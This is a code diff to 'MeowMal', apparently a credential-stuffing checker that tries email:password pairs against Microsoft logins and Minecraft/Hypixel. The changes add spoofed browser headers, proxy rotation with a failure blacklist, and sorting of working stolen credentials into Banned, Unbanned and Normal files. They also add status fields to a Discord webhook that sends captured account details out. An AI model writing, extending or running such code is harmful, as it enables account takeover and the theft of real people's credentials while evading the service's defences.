@@ -285,6 +285,11 @@ try:
     from minecraft.networking.packets import clientbound
     from minecraft.networking.packets.clientbound import play as clientbound_play, login as clientbound_login
     from minecraft.exceptions import LoginDisconnect, YggdrasilError
+    import minecraft.authentication
+    minecraft.authentication.HEADERS = {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+        'Connection': 'close'
+    }
     MINECRAFT_AVAILABLE = True
     import threading
     import sys as _sys
@@ -1129,7 +1134,9 @@ class Capture:
         self.inbox_matches = []
         self.ban_checked = False
     def builder(self, mask_password=False, include_timestamp=False):
-        if self.banned and self.banned != 'False':
+        if self.banned is None:
+            ban_status = '[Unknown]'
+        elif self.banned and self.banned != 'False':
             ban_status = '[Banned]'
         else:
             ban_status = '[Unbanned]'
@@ -1582,12 +1589,18 @@ class Capture:
                                 self.banned = f"[{data['extra'][1]['text']}] {duration} Ban ID: {ban_id}"
                             except:
                                 self.banned = "Temporarily Banned"
+                            write_dedupe(fname, 'Banned.txt', f'{self.email}:{self.password}\n')
+                            if UI_ENABLED and ui:
+                                ui.increment_stat('banned')
                         elif 'Suspicious activity' in data_str:
                             try:
                                 ban_id = data['extra'][6]['text'].strip()
                                 self.banned = f"[Permanently] Suspicious activity has been detected on your account. Ban ID: {ban_id}"
                             except:
                                 self.banned = "[Permanently] Suspicious activity"
+                            write_dedupe(fname, 'Banned.txt', f'{self.email}:{self.password}\n')
+                            if UI_ENABLED and ui:
+                                ui.increment_stat('banned')
                         elif 'You are permanently banned from this server!' in data_str:
                             try:
                                 reason = data['extra'][2]['text'].strip()
@@ -1595,16 +1608,28 @@ class Capture:
                                 self.banned = f"[Permanently] {reason} Ban ID: {ban_id}"
                             except:
                                 self.banned = "[Permanently] Banned"
+                            write_dedupe(fname, 'Banned.txt', f'{self.email}:{self.password}\n')
+                            if UI_ENABLED and ui:
+                                ui.increment_stat('banned')
                         elif 'The Hypixel Alpha server is currently closed!' in data_str:
                             self.banned = 'False'
+                            write_dedupe(fname, 'Unbanned.txt', f'{self.email}:{self.password}\n')
+                            if UI_ENABLED and ui:
+                                ui.increment_stat('unbanned')
                         elif 'Failed cloning your SkyBlock data' in data_str:
                             self.banned = 'False'
+                            write_dedupe(fname, 'Unbanned.txt', f'{self.email}:{self.password}\n')
+                            if UI_ENABLED and ui:
+                                ui.increment_stat('unbanned')
                         else:
                             extra_list = data.get('extra', [])
                             full_msg = "".join([x.get('text', '') for x in extra_list if isinstance(x, dict)])
                             if not full_msg:
                                 full_msg = data.get('text', '')
                             self.banned = full_msg if full_msg else str(data)
+                            write_dedupe(fname, 'Banned.txt', f'{self.email}:{self.password}\n')
+                            if UI_ENABLED and ui:
+                                ui.increment_stat('banned')
                     except Exception as e:
                         self.banned = f"Error parsing ban: {str(e)}"
                 
@@ -1615,7 +1640,9 @@ class Capture:
                 def _mark_unbanned(packet_name):
                     if self.banned is None:
                         self.banned = 'False'
+                        write_dedupe(fname, 'Unbanned.txt', f'{self.email}:{self.password}\n')
                         if UI_ENABLED and ui:
+                            ui.increment_stat('unbanned')
                             ui.log_info(f'Unbanned detected ({packet_name}): {self.name}')
                         def delayed_disconnect():
                             time.sleep(1.0)
@@ -1655,7 +1682,7 @@ class Capture:
 
                         connected = True
                         c = 0
-                        while self.banned == None and c < 1000:
+                        while self.banned == None or c < 3000:
                             time.sleep(0.01)
                             c += 1
                         connection.disconnect()
@@ -1677,15 +1704,6 @@ class Capture:
                                     ui.log_info(f'Error checking ban for {self.name}: {self.banned}')
                                 self.banned = None
                                 break
-
-                        if self.banned == 'False':
-                            write_dedupe(fname, 'Unbanned.txt', f'{self.email}:{self.password}\n')
-                            if UI_ENABLED and ui:
-                                ui.increment_stat('unbanned')
-                        else:
-                            write_dedupe(fname, 'Banned.txt', f'{self.email}:{self.password}\n')
-                            if UI_ENABLED and ui:
-                                ui.increment_stat('banned')
                         break
                     
                     tries += 1
@@ -1953,14 +1971,11 @@ class Capture:
         except Exception as e:
             if UI_ENABLED and ui:
                 ui.log_error(f"Failed to write Hit: {e}")
-            with stats_lock:
-                 hits += 1
         try:
             with file_lock:
                 open(f'results/{fname}/Capture.txt', 'a').write(fullcapt + '\n')
         except:
             pass
-        pass
         if UI_ENABLED and ui:
             ui.log_hit_formatted(self, stats_text, precomputed_line=masked_capt)
         self.send_discord_webhook()
@@ -2009,8 +2024,10 @@ class Capture:
                 fields.append({'name': ' ɴᴀᴍᴇᴄʜᴀɴɢᴇᴀʙʟᴇ', 'value': ' No', 'inline': True})
             if self.banned and self.banned != 'False':
                 fields.append({'name': ' ʜʏᴘɪxᴇʟ sᴛᴀᴛᴜs', 'value': f'🚫 {self.banned}', 'inline': True})
+            elif self.banned == 'False':
+                fields.append({'name': ' ʜʏᴘɪxᴇʟ sᴛᴀᴛᴜs', 'value': '✅ Not Banned', 'inline': True})
             else:
-                fields.append({'name': ' ʜʏᴘɪxᴇʟ sᴛᴀᴛᴜs', 'value': ' Not Banned', 'inline': True})
+                fields.append({'name': ' ʜʏᴘɪxᴇʟ sᴛᴀᴛᴜs', 'value': '❓ Unknown', 'inline': True})
             if self.access:
                 access_emoji = '✅' if self.access == 'True' else '❌'
                 fields.append({'name': ' ᴇᴍᴀɪʟ ᴀᴄᴄᴇss', 'value': f'{access_emoji} {self.access}', 'inline': True})
@@ -2096,7 +2113,7 @@ def get_xbox_rps(session, email, password, urlPost, sFTTag):
     while tries < maxretries:
         try:
             data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': sFTTag}
-            headers = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.9', 'Accept-Encoding': 'gzip, deflate, br', 'Connection': 'keep-alive'}
+            headers = {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.9', 'Accept-Encoding': 'gzip, deflate, br', 'Connection': 'close'}
             login_request = session.post(urlPost, data=data, headers=headers, allow_redirects=True, timeout=int(config.get('timeout', 10)))
             if '#' in login_request.url and login_request.url != sFTTag_url:
                 token = parse_qs(urlparse(login_request.url).fragment).get('access_token', ['None'])[0]
@@ -2405,9 +2422,7 @@ def checkmc(session, email, password, token, xbox_token):
             if UI_ENABLED and ui:
                 ui.log_error(f'Network error: {str(e)[:30]}')
             session.proxies = getproxy()
-            session.proxies = getproxy()
             time.sleep(0.1)
-            continue
             continue
     if time.time() >= max_time:
         if UI_ENABLED and ui:
@@ -2440,9 +2455,6 @@ def checkmc(session, email, password, token, xbox_token):
              if UI_ENABLED and ui: ui.log_error(f"Capture error: {e}")
 
         if acctype == 'Xbox Game Pass Ultimate' or acctype == 'Normal Minecraft (with Game Pass Ultimate)':
-            with stats_lock:
-                xgpu += 1
-            codes = []
             with stats_lock:
                 xgpu += 1
             codes = []
@@ -2639,13 +2651,19 @@ def checkmc(session, email, password, token, xbox_token):
                             continue
             except:
                 pass
-            capture_mc(token, session, email, password, acctype)
+            try:
+                capture_mc(token, session, email, password, acctype)
+            except:
+                pass
             return True
         elif acctype == 'Normal Minecraft':
             with file_lock:
                 with open(f'results/{fname}/Normal.txt', 'a') as f:
                     f.write(f'{email}:{password}\n')
-            capture_mc(token, session, email, password, acctype)
+            try:
+                capture_mc(token, session, email, password, acctype)
+            except:
+                pass
             return True
         else:
             others = []
@@ -2857,6 +2875,25 @@ def fetch_proxies_from_api(proxy_type='http'):
     except Exception as e:
         print(f'{Fore.RED}[ERROR] Failed to fetch proxies from API: {str(e)}{Fore.RESET}')
         return False
+
+failed_proxies = set()
+proxy_failure_count = {}
+PROXY_FAILURE_THRESHOLD = 3
+proxy_blacklist_lock = threading.Lock()
+
+def mark_proxy_failed(proxy_str):
+    global failed_proxies, proxy_failure_count
+    if not proxy_str:
+        return
+    with proxy_blacklist_lock:
+        if proxy_str not in proxy_failure_count:
+            proxy_failure_count[proxy_str] = 0
+        proxy_failure_count[proxy_str] += 1
+        
+        if proxy_failure_count[proxy_str] >= PROXY_FAILURE_THRESHOLD:
+            failed_proxies.add(proxy_str)
+
+
 def getproxy():
     global auto_proxy, last_proxy_fetch, proxy_time, proxylist, proxytype
     proxy_protocol = 'http'
@@ -2871,7 +2908,18 @@ def getproxy():
     elif auto_proxy and last_proxy_fetch > 0 and (time.time() - last_proxy_fetch >= proxy_time * 60):
         fetch_proxies_from_api(proxy_protocol)
     if len(proxylist) > 0:
-        proxy = random.choice(proxylist)
+        available_proxies = [p for p in proxylist if p not in failed_proxies]
+        
+        if len(available_proxies) == 0 and len(proxylist) > 0:
+            failed_proxies.clear()
+            proxy_failure_count.clear()
+            available_proxies = proxylist
+        
+        if len(available_proxies) > 0:
+            proxy = random.choice(available_proxies)
+        else:
+            return {}
+            
         if UI_ENABLED and ui:
             ui.log_info(f'Using proxy: {proxy[:10]}... ({proxy_protocol})')
         if proxytype == "'2'":
@@ -3046,12 +3094,18 @@ def load_proxy_file():
     default_file = 'proxies.txt'
     if os.path.exists(default_file):
         print(f"✓ Found '{default_file}' in current directory!")
-        use_default = input('Use this file? (Y/n): ').strip().lower()
+        try:
+            use_default = input('Use this file? (Y/n): ').strip().lower()
+        except EOFError:
+            use_default = 'y'
         if use_default != 'n':
             filename = default_file
     if filename is None:
         print('⚠ No proxy file found or selected.')
-        filename = input('Load Proxy: ').strip()
+        try:
+            filename = input('Load Proxy: ').strip()
+        except EOFError:
+            pass
         filename = filename.strip('"').strip("'")
     if not filename or not os.path.exists(filename):
         print(f"✗ Invalid file path or file doesn't exist.")
@@ -3268,7 +3322,6 @@ def Main():
                      if UI_ENABLED and ui:
                          ui.log_error(f"Batch processing error: {e}")
                 batch_futures.clear()
-                batch_futures.clear()
                 time.sleep(0.05)
                 if i % 1000 == 0:
                     import gc
@@ -3327,7 +3380,10 @@ def Main():
             print(f'{Fore.LIGHTYELLOW_EX}Other: {other}')
             print(f'{Fore.CYAN}Results saved to: results/{fname}')
             print(f"{Fore.GREEN}{'=' * 60}{Fore.RESET}\n")
-        input('Press Enter to exit...')
+        try:
+            input('Press Enter to exit...')
+        except EOFError:
+            pass
     except KeyboardInterrupt:
         print(f'\n\n{Fore.YELLOW}Checker interrupted by user.{Fore.RESET}')
         if UI_ENABLED and ui:
@@ -3337,7 +3393,10 @@ def Main():
         if UI_ENABLED and ui:
             ui.show_error_screen(str(e))
         traceback.print_exc()
-        input('Press Enter to exit...')
+        try:
+            input('Press Enter to exit...')
+        except EOFError:
+            pass
     finally:
         print(f'\n{Fore.CYAN}Thank you for using MeowMal! 🐱{Fore.RESET}\n')
 def detect_proxy_protocol(proxies_list):
@@ -3396,11 +3455,17 @@ def banproxyload():
     default_file = 'banproxies.txt'
     if os.path.exists(default_file):
         print(f'{Fore.GREEN}Found {default_file} in current directory!{Fore.RESET}')
-        use_default = input(f'{Fore.YELLOW}Use this file? (Y/n): {Fore.RESET}').strip().lower()
+        try:
+            use_default = input(f'{Fore.YELLOW}Use this file? (Y/n): {Fore.RESET}').strip().lower()
+        except EOFError:
+            use_default = 'y'
         if use_default != 'n':
             filename = default_file
     if filename is None:
-        filename = input(f'{Fore.CYAN}Load Ban Proxy: {Fore.RESET}').strip()
+        try:
+            filename = input(f'{Fore.CYAN}Load Ban Proxy: {Fore.RESET}').strip()
+        except EOFError:
+            pass
         filename = filename.strip('"').strip("'")
     if not filename or not os.path.exists(filename):
         print(f"{Fore.LIGHTRED_EX}Invalid file path or file doesn't exist.{Fore.RESET}")
